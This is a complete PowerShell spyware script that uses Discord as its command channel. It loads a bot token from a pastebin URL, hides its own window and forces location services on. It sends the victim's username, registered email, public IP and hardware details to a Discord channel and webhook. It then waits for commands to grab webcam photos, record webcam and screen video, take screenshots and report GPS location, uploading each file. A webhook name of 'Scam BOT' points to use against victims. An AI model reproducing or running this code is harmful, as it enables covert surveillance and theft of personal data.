<#

ADD YOUR TOKEN AND OPTIONAL WEBHOOK INSIDE THE EMPTY QUOTES
SAVE TO A PASTEBIN FILE NAMED 'file.json' 

{
  "tk": "",
  "wh": ""
}

#>

$keys = irm "$keys" # REPLACE WITH YOUR PASTEBIN RAW URL

function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

Function NewChannel{
    $headers = @{
        'Authorization' = "Bot $token"
    }    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)    
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    foreach ($guild in $guilds) {
        $guildID = $guild.id
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $body = @{
        "name" = "session-$randomLetters"
        "type" = 0
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new channel is: $($responseObj.id)"
    $global:ChannelID = $responseObj.id
}

function sendMsg {
    param([string]$Message,[string]$Embed)

    $url = "https://discord.com/api/v9/channels/$ChannelID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")

    if ($Embed) {
        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        if ($webhook){
            $body = @{"username" = "Scam BOT" ;"content" = "$jsonBody"} | ConvertTo-Json
            IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
        }
        $jsonPayload = $null
    }
    if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
            if ($webhook){
                IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
            }
	        $message = $null
    }
}

Function GetFfmpeg{
    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.1.1-essentials_build.zip'
        $tempDir = "$env:temp"
        $zipFilePath = Join-Path $tempDir 'ffmpeg-6.1.1-essentials_build.zip'
        $extractedDir = Join-Path $tempDir 'ffmpeg-6.1.1-essentials_build'
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        Remove-Item -Path $zipFilePath -Force
        Remove-Item -Path $extractedDir -Recurse -Force
    }
}

function Enable-LocationServices {
    try {
        
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\lfsvc\Service\Configuration" -Name "Status" -Value 1 -ErrorAction Stop
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Allow" -ErrorAction Stop
        Start-Service lfsvc -ErrorAction Stop

    } catch {
    }
}

$locationJob = {
    param ([string]$token,[string]$channelId,[string]$webhook)

    Add-Type -AssemblyName System.Device
    $Loc = New-Object System.Device.Location.GeoCoordinateWatcher
    $Loc.Start()

    while (($Loc.Status -ne 'Ready') -and ($Loc.Permission -ne 'Denied')) {
    	Sleep -M 100
    }  
    if ($Loc.Permission -eq 'Denied'){
        $GPS = "Location Services Off"
    }
    else{
    	$GL = $Loc.Position.Location | Select Latitude,Longitude
    	$GL = $GL -split " "
    	$Lat = $GL[0].Substring(11) -replace ".$"
    	$Lon = $GL[1].Substring(10) -replace ".$"
        $GPS = "LAT = $Lat LONG = $Lon"
    }

    $url = "https://discord.com/api/v10/channels/$channelId/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $jsonBody = @{
        "content" = ":pushpin: ``$GPS`` :pushpin:"
        "username" = "$env:COMPUTERNAME"
    } | ConvertTo-Json
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($url, "POST", $jsonBody)
    if ($webhook){
        IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
    }
    $message = $null
}


$camrecordJob = {
    param ([string]$token,[string]$channelId,[string]$webhook)

    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$channelId/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($webhook){
                    $hooksend = $wc.UploadFile($webhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $tempDir = "$env:temp"
    $outputFile = Join-Path -Path $tempDir -ChildPath "webcam_video.mp4"
    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
    .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -t 10 -vcodec libx264 -b 6000k -r 10 -y $outputFile
    sendFile -sendfilePath $outputFile | Out-Null
    sleep 1
    Remove-Item -Path $outputFile -Force
}

$camJob = {
    param ([string]$token,[string]$channelId,[string]$webhook)
    
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$channelId/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($webhook){
                    $hooksend = $wc.UploadFile($webhook, "POST", $sendfilePath)
                }
            }
        }
    }  
    $tempDir = "$env:temp"
    $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
    .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
    sendFile -sendfilePath $imagePath | Out-Null
    sleep 1
    Remove-Item -Path $imagePath -Force
}

$screenJob = {
    param ([string]$token,[string]$channelId,[string]$webhook)

    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$channelId/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($webhook){
                    $hooksend = $wc.UploadFile($webhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $mkvPath = "$env:Temp\ScreenClip.mp4"    
    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 10 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
    sleep 1
    sendFile -sendfilePath $mkvPath | Out-Null
    sleep 1
    Remove-Item -Path $mkvPath -Force 
}

Function Screenshot {

    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$channelId/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($webhook){
                    $hooksend = $wc.UploadFile($webhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    $mkvPath = "$env:Temp\ScreenClip.jpg"
    .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
    sleep 2
    sendFile -sendfilePath $mkvPath | Out-Null
    sleep 5
    rm -Path $mkvPath -Force
}

Function quickInfo{
    Add-Type -AssemblyName System.Windows.Forms
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    } else {
        $adminperm = "True"
    }
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $videocardinfo = Get-WmiObject Win32_VideoController
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $OSString = "$($systemInfo.Caption)"
    $OSArch = "$($systemInfo.OSArchitecture)"
    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videocardinfo.Name)"
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
    $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    $script:jsonPayload = @{
        username   = $env:COMPUTERNAME
        tts        = $false
        embeds     = @(
            @{
                title       = "$env:COMPUTERNAME | Computer Information "
                "description" = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator Session** : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architechture**         : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor`` 
- **Memory**                : ``$RamInfo``
- **Gpu**                   : ``$gpu``
- **Screen Size**           : ``$screensize``

``````COMMAND LIST``````
- **Webcam**                : Send webcam screenshot to Discord
- **RecordWebcam**          : Record webcam video clip to Discord
- **Screenshot**            : Send Desktop screenshot to Discord
- **RecordScreen**          : Record Desktop video clip to Discord
- **Location**              : Get Machine Location
- **Close**                 : Close this session

"@
                color       = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload -webhook $webhook
}


$global:token = $keys.tk
$global:webhook = $keys.wh

if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Enable-LocationServices
}

HideWindow
newChannel
quickInfo

$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)){  
    GetFfmpeg
}

sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Session Started!`` :white_check_mark:" -webhook $webhook

while ($true) {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$channelId/messages")
    $most_recent_message = ($messages | ConvertFrom-Json)[0]
    if (-not $most_recent_message.author.bot) {
        $latestMessageId = $most_recent_message.timestamp
        $messages = $most_recent_message.content
    }
    if ($latestMessageId -ne $lastMessageId) {
        $lastMessageId = $latestMessageId
        $global:latestMessageContent = $messages
        if ($messages -eq 'webcam'){
            Start-Job -ScriptBlock $camJob -Name Capture -ArgumentList $global:token, $global:ChannelID, $global:webhook | Out-Null
            sendMsg -Message ":camera: ``Getting Webcam Screenshot on : $env:COMPUTERNAME`` :camera:" -webhook $webhook
        }
        if ($messages -eq 'recordwebcam'){
            Start-Job -ScriptBlock $camrecordJob -Name Record -ArgumentList $global:token, $global:ChannelID, $global:webhook | Out-Null
            sendMsg -Message ":movie_camera: ``Recording Clip from Webcam on : $env:COMPUTERNAME`` :movie_camera:" -webhook $webhook
        }
        if ($messages -eq 'screenshot'){
            sendMsg -Message ":desktop: ``Taking Screenshot on : $env:COMPUTERNAME`` :desktop:" -webhook $webhook
            Screenshot
        }
        if ($messages -eq 'recordscreen'){
            Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ChannelID, $global:webhook | Out-Null
            sendMsg -Message ":desktop: ``Recording Screen on : $env:COMPUTERNAME`` :desktop:" -webhook $webhook
        }
        if ($messages -eq 'location'){
            Start-Job -ScriptBlock $locationJob -Name Locate -ArgumentList $global:token, $global:ChannelID, $global:webhook | Out-Null
            sendMsg -Message "Attempting Location from : $env:COMPUTERNAME" -webhook $webhook
        }
        if ($messages -eq 'kill'){
            Stop-Job -Name Capture
            Stop-Job -Name Screen
            Stop-Job -Name Record     
        }
        if ($messages -eq 'close'){
            sendMsg -Message ":no_entry: ``Closing Session : $env:COMPUTERNAME`` :no_entry:" -webhook $webhook 
            sleep 1
            exit      
        }
    }
    Sleep 5
}
